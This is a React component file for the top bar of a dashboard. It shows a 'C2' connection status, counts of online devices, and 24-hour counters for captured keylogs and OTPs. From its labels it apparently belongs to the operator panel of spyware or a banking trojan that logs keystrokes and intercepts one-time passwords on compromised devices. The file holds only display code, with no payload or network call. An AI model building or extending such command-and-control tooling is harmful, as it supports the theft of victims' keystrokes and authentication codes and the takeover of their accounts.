import { useDeviceStore } from '@/stores/devices';

export default function Topbar({ title, subtitle }: { title: string; subtitle?: string }) {
  const devices = useDeviceStore((s) => s.devices);
  const stats = useDeviceStore((s) => s.stats);
  const connected = useDeviceStore((s) => s.connected);
  const online = devices.filter((d) => d.status === 'online').length;
  return (
    <header className="border-b border-slate-800 bg-void/90 backdrop-blur px-6 py-3 flex flex-wrap items-center gap-3 shrink-0">
      <div>
        <h1 className="text-base font-bold text-slate-100">{title}</h1>
        {subtitle && <p className="text-[11px] text-slate-500">{subtitle}</p>}
      </div>
      <div className="ml-auto flex items-center gap-2 text-[11px]">
        <span className="flex items-center gap-1.5 rounded-lg bg-slate-900 border border-slate-800 px-3 py-1.5">
          <span className={`h-1.5 w-1.5 rounded-full ${connected ? 'bg-emerald-400' : 'bg-amber-400 blink'}`} />
          C2 {connected ? 'connected' : 'reconnecting…'}
        </span>
        <span className="rounded-lg bg-slate-900 border border-slate-800 px-3 py-1.5 text-emerald-400 font-mono">
          ● {online}/{devices.length}
        </span>
        <span className="rounded-lg bg-slate-900 border border-slate-800 px-3 py-1.5 text-sky-300 font-mono">
          ⌨ {stats?.keylogs24h ?? 0}
        </span>
        <span className="rounded-lg bg-slate-900 border border-slate-800 px-3 py-1.5 text-amber-300 font-mono">
          🔐 {stats?.otps24h ?? 0}
        </span>
      </div>
    </header>
  );
}
